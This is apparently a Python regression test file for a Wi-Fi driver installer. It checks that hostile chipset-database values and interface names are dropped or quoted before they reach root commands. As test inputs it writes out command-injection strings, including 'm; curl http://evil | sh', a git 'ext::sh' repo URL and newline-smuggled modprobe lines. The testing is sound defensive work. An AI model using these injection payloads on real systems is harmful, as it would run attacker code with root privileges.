"""Regressions for the v1.0.0 hardening pass.

Each test here stands for a specific thing that was wrong, so the comment above
it says what. They fall into three groups:

* **the database is executable content** — it is interpolated into commands run
  as root, and was only checked at review time, not at load;
* **arguments reaching privileged tools** — an interface name is typed by the
  user and handed to something running under sudo;
* **honesty** — a flow that reported success it had not observed, or crashed
  rather than answering.
"""

from __future__ import annotations

import contextlib
import copy
import io
import json
import re
import tempfile
import unittest
from pathlib import Path

from airdriver import cli
from airdriver.core import monitor as mon
from airdriver.core import setup as setup_flow
from airdriver.core.chipset_db import ChipsetDB, DatabaseError, data_path
from airdriver.core.detector import Adapter, WirelessInterface
from airdriver.core.installer import Executor, InstallPlan, Step, select_driver
from airdriver.core.system import SystemInfo


def _kali(**over):
    base = dict(os="Linux", is_linux=True, distro_id="kali", distro_name="Kali",
                is_debian_based=True, arch="x86_64", kernel_release="6.16.0-amd64",
                headers_installed=True, dkms_installed=True, build_tools=True,
                secure_boot="off", is_root=True, has_internet=True)
    base.update(over)
    return SystemInfo(**base)


def _db_with(entry_over) -> ChipsetDB:
    """The real database plus one hostile entry, loaded from a temp file."""
    raw = json.loads(data_path("chipsets.json").read_text())
    base = copy.deepcopy(next(c for c in raw["chipsets"] if c["id"] == "rtl8812au"))
    base.update({"id": "evil", "usb_ids": ["dead:beef"], "kernel_native": None,
                 "prefer_out_of_tree": False})
    base.update(entry_over)
    raw["chipsets"].append(base)
    p = Path(tempfile.mkdtemp()) / "evil.json"
    p.write_text(json.dumps(raw))
    return ChipsetDB.load(p)


# --------------------------------------------------------------------------- #
# The database is not trusted at load, not merely at review                   #
# --------------------------------------------------------------------------- #
class UnsafeDatabaseValuesNeverReachAShell(unittest.TestCase):
    """`db --check` catches a hostile *pull request*. It does nothing about a
    file that was edited on disk, pointed at with a path, or shipped by a
    third-party package — and nothing called it before the values were used."""

    def test_an_unsafe_module_is_dropped_at_load(self):
        db = _db_with({"drivers": [{"method": "dkms_git",
                                    "repo": "https://github.com/a/b",
                                    "module": "m; curl http://evil | sh",
                                    "priority": 1}]})
        chip = db.get("evil")
        self.assertEqual(chip.drivers, (),
                         "an unsafe driver option survived the load")
        self.assertTrue(any("unsafe module" in w for w in db.load_warnings),
                        db.load_warnings)

    def test_an_unsafe_repo_is_dropped_at_load(self):
        db = _db_with({"drivers": [{"method": "dkms_git",
                                    "repo": "ext::sh -c 'id > /tmp/x'",
                                    "module": "m", "priority": 1}]})
        self.assertEqual(db.get("evil").drivers, ())
        self.assertTrue(any("unsafe repo" in w for w in db.load_warnings))

    def test_an_unsafe_blacklist_entry_is_dropped_at_load(self):
        db = _db_with({"blacklist": ["r8188eu", "evil\ninstall x /bin/sh"]})
        self.assertEqual(db.get("evil").blacklist, ("r8188eu",))
        self.assertTrue(any("blacklist" in w for w in db.load_warnings))

    def test_the_drop_is_still_reported_by_db_check(self):
        """Dropping must not *hide* the problem: `db --check` still fails, or a
        tampered file would quietly pass review."""
        db = _db_with({"blacklist": ["evil; touch /tmp/pwned"]})
        self.assertTrue([p for p in db.problems() if p.startswith("evil:")],
                        "the loader swallowed the problem instead of reporting it")

    def test_strict_mode_refuses_outright(self):
        raw = json.loads(data_path("chipsets.json").read_text())
        raw["chipsets"][0]["blacklist"] = ["x; id"]
        p = Path(tempfile.mkdtemp()) / "bad.json"
        p.write_text(json.dumps(raw))
        with self.assertRaises(DatabaseError):
            ChipsetDB.load(p, strict=True)

    def test_the_shipped_database_drops_nothing(self):
        self.assertEqual(ChipsetDB.load().load_warnings, [])

    def test_a_corrupt_file_is_an_error_not_a_traceback(self):
        p = Path(tempfile.mkdtemp()) / "broken.json"
        p.write_text("{ not json")
        with self.assertRaises(DatabaseError):
            ChipsetDB.load(p)
        with self.assertRaises(DatabaseError):
            ChipsetDB.load(Path(tempfile.mkdtemp()) / "absent.json")


class ModuleNamesAreQuotedEverywhere(unittest.TestCase):
    """`airdriver fix` built `sudo modprobe {m}` by interpolation while every
    other call site quoted the same value.

    The loader now drops a module name like this before it gets here, so the
    chipset is constructed directly: these are two independent layers and each
    one has to hold on its own.
    """

    def test_fix_quotes_the_module_name(self):
        from airdriver.core.chipset_db import Chipset, DriverOption
        hostile = Chipset(
            id="evil", name="Evil", vendor="x", wifi="n", band="2.4",
            monitor_mode=True, injection=False, injection_quality="unknown",
            notes="", adapters=(), usb_ids=("dead:beef",),
            drivers=(DriverOption(method="dkms_git", priority=1,
                                  repo="https://example.invalid/a",
                                  module="m; touch /tmp/pwned"),),
            blacklist=())
        db = ChipsetDB([hostile], {})
        shells = []

        class _Args:
            target = "evil"

        real_run = Executor.run
        try:
            Executor.run = lambda self, plan, log: (
                shells.extend(s.shell for s in plan.steps if s.shell) or True)
            with contextlib.redirect_stdout(io.StringIO()):
                cli.cmd_fix(_Args(), db)
        finally:
            Executor.run = real_run

        modprobes = [sh for sh in shells if "modprobe" in sh]
        self.assertTrue(modprobes, "fix built no modprobe step at all")
        for sh in modprobes:
            self.assertNotRegex(
                sh, r"modprobe (?:-r )?[^'\"]*touch /tmp/pwned",
                f"the payload reached the shell unquoted: {sh}")
            self.assertIn("'m; touch /tmp/pwned'", sh,
                          f"module name not single-quoted: {sh}")


# --------------------------------------------------------------------------- #
# Arguments that reach a tool running under sudo                              #
# --------------------------------------------------------------------------- #
class InterfaceNamesAreValidated(unittest.TestCase):
    """The interface is typed into an editable combo box and passed to
    `sudo airmon-ng …`. "-x" is a perfectly good string and a terrible
    interface name."""

    def test_an_option_shaped_name_is_refused(self):
        for bad in ("-x", "--help", "wlan0; id", "", "a" * 40, "wlan 0"):
            with self.subTest(bad=bad):
                self.assertFalse(mon.valid_interface(bad))
                self.assertFalse(mon.enable_monitor(bad).ok)
                self.assertFalse(mon.disable_monitor(bad).ok)
                self.assertFalse(mon.test_injection(bad).ok)

    def test_real_names_are_accepted(self):
        for good in ("wlan0", "wlan0mon", "wlp3s0", "wlx00c0ca123456", "mon0"):
            self.assertTrue(mon.valid_interface(good), good)

    def test_iw_is_told_which_device_explicitly(self):
        """`iw <name> …` resolves the first word as a command first, so an
        interface called "list" or "phy" would be read as one."""
        src = Path(mon.__file__).read_text()
        self.assertNotRegex(src, r'\["iw", interface',
                            "iw is being called without an explicit 'dev'")


# --------------------------------------------------------------------------- #
# Honesty                                                                     #
# --------------------------------------------------------------------------- #
class SetupAnswersInsteadOfCrashing(unittest.TestCase):
    def test_targeting_a_detected_but_unknown_adapter(self):
        """`pick_adapter` matches any plugged-in adapter by usb id, including
        one with no chipset — and the next line read chip.monitor_mode."""
        db = ChipsetDB.load()
        unknown = Adapter(bus="1", device="2", vid="dead", pid="beef",
                          description="mystery dongle", chipset=None)
        got, why = setup_flow.pick_adapter([unknown], "dead:beef")
        self.assertIs(got, unknown)

        out = setup_flow.Outcome(adapter=unknown)
        out.add("Detect adapter", setup_flow.OK, "found")
        # The real run() does this via its own guard; assert the guard exists
        # by running the whole flow against the unknown adapter.
        import airdriver.core.detector as detector
        real_detect = detector.detect
        try:
            detector.detect = lambda *a, **k: [unknown]
            result = setup_flow.run(db, target="dead:beef", log=lambda _s: None)
        finally:
            detector.detect = real_detect
        self.assertFalse(result.ready)
        self.assertTrue(any(s.state == setup_flow.FAIL for s in result.stages))
        self.assertIn("not in the chipset database",
                      " ".join(s.detail for s in result.stages))


class TheDriverStageReportsWhatHappened(unittest.TestCase):
    def test_a_failed_install_is_not_reported_as_ok(self):
        """The stage line used to read "install plan ran" whatever the executor
        returned, which is the one thing this flow must never do."""
        src = Path(setup_flow.__file__).read_text()
        self.assertNotIn('Executor(info, dry_run=False).run(plan, log=log)\n'
                         '        out.add("Driver", OK', src)
        self.assertIn("ran_clean", src)


class AnUnboundAdapterIsNotWorking(unittest.TestCase):
    def test_a_placeholder_interface_is_not_a_bound_driver(self):
        a = Adapter(bus="1", device="2", vid="0bda", pid="8812", description="x")
        a.interface = WirelessInterface(name="(not bound)", driver="", mode="")
        self.assertIsNone(a.bound_interface)
        self.assertFalse(a.driver_loaded)
        self.assertNotIn("Working", a.status)

    def test_a_real_interface_is(self):
        a = Adapter(bus="1", device="2", vid="0bda", pid="8812", description="x")
        a.interface = WirelessInterface(name="wlan1", driver="88XXau")
        self.assertIsNotNone(a.bound_interface)
        self.assertIn("Working", a.status)


# --------------------------------------------------------------------------- #
# Driver choice                                                               #
# --------------------------------------------------------------------------- #
class InjectionChipsetsPreferTheOutOfTreeDriver(unittest.TestCase):
    """rtw88 gained in-kernel RTL8812AU/8814AU support, and the mere existence
    of `kernel_native` made AirDriver skip the build — handing a pentester the
    driver the database itself says is worse for injection."""

    def setUp(self):
        self.db = ChipsetDB.load()

    def test_the_flagged_chipsets_build_the_out_of_tree_driver(self):
        chip = self.db.get("rtl8812au")
        self.assertTrue(chip.prefer_out_of_tree)
        opt, reason = select_driver(chip, _kali(is_linux=False))
        self.assertIsNotNone(opt, f"skipped the build anyway: {reason}")
        self.assertNotEqual(opt.method, "kernel_native")
        self.assertIn("injects reliably only with the out-of-tree", reason)

    def test_prefer_kernel_overrides_it(self):
        chip = self.db.get("rtl8812au")
        opt, reason = select_driver(chip, _kali(is_linux=False), prefer_kernel=True)
        self.assertIsNone(opt, "the escape hatch did not take the in-kernel path")
        self.assertIn("no build needed", reason)

    def test_an_ordinary_chipset_still_skips_the_build(self):
        """The flag must be the exception, not a blanket "always build"."""
        chip = self.db.get("ar9271")
        self.assertFalse(chip.prefer_out_of_tree)
        opt, reason = select_driver(chip, _kali(is_linux=False))
        self.assertIsNone(opt, reason)

    def test_offline_falls_back_to_the_in_kernel_driver(self):
        """With nothing buildable, the in-kernel driver beats no driver."""
        chip = self.db.get("rtl8812au")
        opt, reason = select_driver(chip, _kali(is_linux=False, has_internet=False))
        self.assertIsNone(opt)
        self.assertIn("nothing buildable", reason)


class ContestedIdsAreExplainedNotGuessed(unittest.TestCase):
    def setUp(self):
        self.db = ChipsetDB.load()

    def test_a_contested_id_belongs_to_no_chipset(self):
        for uid in self.db.meta["contested_ids"]:
            with self.subTest(uid=uid):
                self.assertIsNone(self.db.match_usb(uid),
                                  f"{uid} is claimed by two kernel drivers but the "
                                  "database picked one anyway")

    def test_each_one_carries_its_reasons(self):
        for uid, entry in self.db.meta["contested_ids"].items():
            with self.subTest(uid=uid):
                self.assertRegex(uid, r"^[0-9a-f]{4}:[0-9a-f]{4}$")
                self.assertGreaterEqual(len(entry["drivers"]), 2,
                                        "contested means at least two claimants")
                self.assertTrue(entry["note"].strip())

    def test_the_lookup_is_case_insensitive_and_safe(self):
        self.assertIsNotNone(self.db.contested("148F:760A"))
        self.assertIsNone(self.db.contested("0bda:8812"))
        self.assertIsNone(self.db.contested("nonsense"))


class TheDatabaseMatchesTheKernelTables(unittest.TestCase):
    """Spot-checks for ids that were wrong, or newly added, in v1.0.0. These are
    the kernel's own assignments; getting one wrong installs the wrong driver."""

    def setUp(self):
        self.db = ChipsetDB.load()

    def test_senao_id_belongs_to_rt2800usb_not_carl9170(self):
        chip = self.db.match_usb("1740:0605")
        self.assertIsNotNone(chip)
        self.assertEqual(chip.id, "rt2800usb_other")

    def test_new_families_are_present_and_well_formed(self):
        for cid, uid in (("rtl8822cu", "0bda:c82c"), ("rtl8723du", "0bda:d723"),
                         ("mt7663u", "0e8d:7663"), ("mt7915_pci", "14c3:7915"),
                         ("mt7996_pci", "14c3:7990"), ("rsi_91x", "1618:9113")):
            with self.subTest(cid=cid):
                chip = self.db.get(cid)
                self.assertIsNotNone(chip, f"{cid} is missing")
                self.assertEqual(self.db.match_usb(uid).id, cid)
                self.assertTrue(chip.drivers)

    def test_new_families_do_not_claim_injection_without_evidence(self):
        """"Injection is claimed only with a track record" is a rule, not a
        preference — `recommend` offers whatever claims it."""
        for cid in ("rtl8822cu", "rtl8723du", "mt7663u", "mt7915_pci",
                    "mt7996_pci", "rsi_91x"):
            with self.subTest(cid=cid):
                self.assertFalse(self.db.get(cid).injection)


class TheDatabaseFileStaysReviewable(unittest.TestCase):
    def test_it_is_formatted(self):
        """A reformatted database turns a one-line change into a 1 200-line
        diff, which is how a bad id slips through review."""
        import importlib.util
        root = Path(__file__).resolve().parent.parent
        spec = importlib.util.spec_from_file_location(
            "fmt_chipsets", root / "scripts" / "fmt_chipsets.py")
        fmt = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(fmt)
        path = data_path("chipsets.json")
        self.assertEqual(path.read_text(), fmt.dumps(json.loads(path.read_text())),
                         "chipsets.json is not formatted — run "
                         "python3 scripts/fmt_chipsets.py")


if __name__ == "__main__":
    unittest.main()
